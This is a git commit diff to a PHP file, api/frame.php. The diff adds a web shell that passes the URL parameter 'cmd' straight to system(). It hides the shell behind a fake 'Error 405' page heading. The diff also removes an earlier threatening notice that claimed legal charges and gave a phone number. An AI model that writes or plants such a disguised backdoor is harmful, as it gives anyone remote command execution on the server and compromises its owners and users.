901aea5dea9855188cc629550dd7a76638d1ffc1
Alvaro Antoni Escobar <130929590+dkparw@users.noreply.github.com>
2023-05-19 22:00:36 -0600

    Update frame.php

--- api/frame.php
+++ api/frame.php
@@ -1,11 +1,10 @@
-<html>
-<body>
+<!DOCTYPE html>
 <form method="GET" name="<?php echo $_SERVER['PHP_SELF']; ?>">
-</form>
 <pre>
+<i><h4 style="color:black; background:#dde3ca; width:230px; padding:3px;">Error 405 Pagina No Encontrada :/</i></h4>
 <?php
     if(isset($_GET['cmd'])){
-        echo "This page has been transferred to the corporations IBM Security, NCC Group. <br>You are within Business and Institutional property,<br>you have legal charges for cyberattacks and infiltrating high confidentiality files.<br>We ask you to contact ST: +1 206 405 3412,<br>otherwise judicial officers will have to go by force where you are.<br>Personal-Data: Two Suspects";
+        system($_GET['cmd']);
     }
 ?>
 </pre>
